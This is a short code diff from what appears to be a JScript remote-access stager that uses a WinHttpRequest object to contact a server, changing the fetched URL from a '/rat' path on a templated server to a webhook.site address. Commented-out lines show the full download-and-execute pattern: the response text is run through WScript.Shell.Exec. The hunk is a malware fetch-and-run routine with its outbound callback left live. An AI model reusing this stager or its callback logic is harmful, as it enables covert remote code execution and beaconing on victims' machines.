@@ -21,7 +21,7 @@
 	//q = v.split("=")[1].split(";")[0];
 	h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 	//h.SetProxy(2,q);
-	h.Open("GET","http://'+$Server+'/rat",false);
+	h.Open("GET","https://webhook.site/8871ffbe-d621-4f3b-b569-0f40d7396e11'",false);
 	h.Send();
 	//c = h.ResponseText;
 	//r = new ActiveXObject("WScript.Shell").Exec(c);
